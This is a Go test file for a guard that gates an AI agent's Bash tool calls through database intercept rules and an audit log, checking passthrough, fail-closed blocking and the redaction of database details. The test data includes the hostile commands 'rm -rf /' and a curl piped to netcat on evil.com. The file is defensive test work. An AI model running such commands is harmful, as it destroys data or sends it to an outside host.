package guard

import (
	"bytes"
	"context"
	"database/sql"
	"database/sql/driver"
	"encoding/json"
	"errors"
	"io"
	"log"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/intercept"
	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse

func TestPreToolUseBlocksUnavailableInterceptConfig(t *testing.T) {
	conn, err := sql.Open("pgx", "postgres://invalid@127.0.0.1:1/unused?sslmode=disable")
	if err != nil {
		t.Fatal(err)
	}
	// A closed connection pool deterministically returns a database error before
	// connecting anywhere; this regression never uses the user's configured DB.
	if err := conn.Close(); err != nil {
		t.Fatal(err)
	}
	g := NewWithInterceptor(intercept.New(&db.DB{DB: conn}))
	blocked, message, _ := g.Hooks().PreToolUse(t.Context(), "Bash", json.RawMessage(`{"command":"local probe"}`))
	if !blocked || !strings.Contains(message, "平台管控") {
		t.Fatalf("configuration failure allowed tool execution: blocked=%v message=%q", blocked, message)
	}
	entries := g.Audit()
	if entries[len(entries)-1].Action != "block" {
		t.Fatal("configuration failure was not recorded as blocked")
	}
}

func TestConfigFailureDoesNotExposeDatabaseDetails(t *testing.T) {
	const diagnostic = "failed to connect host=internal-db.service.local user=svc_guard database=artex-internal"
	var logs bytes.Buffer
	previousOutput := log.Writer()
	log.SetOutput(&logs)
	t.Cleanup(func() { log.SetOutput(previousOutput) })
	for _, failKind := range []string{"tools", "rules", "judge"} {
		t.Run(failKind, func(t *testing.T) {
			logs.Reset()
			conn := sql.OpenDB(guardConfigFailureConnector{failKind: failKind, err: errors.New(diagnostic)})
			t.Cleanup(func() { _ = conn.Close() })
			g := NewWithInterceptor(intercept.New(&db.DB{DB: conn}))
			blocked, message, _ := g.Hooks().PreToolUse(t.Context(), "Bash", json.RawMessage(`{}`))
			if !blocked || !strings.Contains(message, "平台管控") {
				t.Fatalf("configuration failure did not block: blocked=%v message=%q", blocked, message)
			}
			for _, private := range []string{"internal-db.service.local", "svc_guard", "artex-internal"} {
				if strings.Contains(message, private) {
					t.Fatalf("model-facing block message exposed private database detail %q: %s", private, message)
				}
			}
			if !strings.Contains(logs.String(), diagnostic) {
				t.Fatal("complete configuration error was not saved in the server log")
			}
		})
	}
}

type guardConfigFailureConnector struct {
	failKind string
	err      error
}

func (c guardConfigFailureConnector) Connect(context.Context) (driver.Conn, error) {
	return guardConfigFailureConn{c}, nil
}
func (guardConfigFailureConnector) Driver() driver.Driver { return guardConfigFailureDriver{} }

type guardConfigFailureDriver struct{}

func (guardConfigFailureDriver) Open(string) (driver.Conn, error) {
	return nil, errors.New("use connector")
}

type guardConfigFailureConn struct{ config guardConfigFailureConnector }

func (guardConfigFailureConn) Prepare(string) (driver.Stmt, error) {
	return nil, errors.New("unexpected prepare")
}
func (guardConfigFailureConn) Close() error { return nil }
func (guardConfigFailureConn) Begin() (driver.Tx, error) {
	return nil, errors.New("unexpected transaction")
}
func (c guardConfigFailureConn) QueryContext(_ context.Context, query string, args []driver.NamedValue) (driver.Rows, error) {
	if strings.Contains(query, "FROM intercept_rules") {
		if c.config.failKind == "rules" {
			return nil, c.config.err
		}
		return &guardConfigFailureRows{columns: make([]string, 14)}, nil
	}
	if strings.Contains(query, "FROM settings") {
		key := args[0].Value.(string)
		if key == "intercept_enabled_tools" {
			if c.config.failKind == "tools" {
				return nil, c.config.err
			}
			return &guardConfigFailureRows{columns: []string{"value"}, value: `["Bash"]`}, nil
		}
		if key == "llm_judge_enabled" {
			return nil, c.config.err
		}
	}
	return nil, errors.New("unexpected query")
}

type guardConfigFailureRows struct {
	columns []string
	value   string
}

func (r *guardConfigFailureRows) Columns() []string { return r.columns }
func (r *guardConfigFailureRows) Close() error      { return nil }
func (r *guardConfigFailureRows) Next(dest []driver.Value) error {
	if r.value == "" {
		return io.EOF
	}
	dest[0] = r.value
	r.value = ""
	return nil
}
